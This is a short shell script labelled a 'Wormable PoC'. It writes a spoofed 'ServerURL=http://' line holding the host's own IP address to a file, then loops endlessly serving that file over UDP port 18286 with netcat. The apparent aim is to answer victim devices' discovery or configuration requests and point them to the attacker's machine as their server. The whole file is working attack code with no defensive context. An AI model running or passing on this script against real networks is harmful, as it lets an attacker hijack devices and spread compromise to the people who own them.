#!/bin/sh
#Wormable PoC
(echo -n 'ServerURL=http://';ifconfig eth0|grep inet|cut -d: -f2|cut -d' ' -f1) > spoof
while (true); do
    nc -ulw 2 18286 < spoof
done
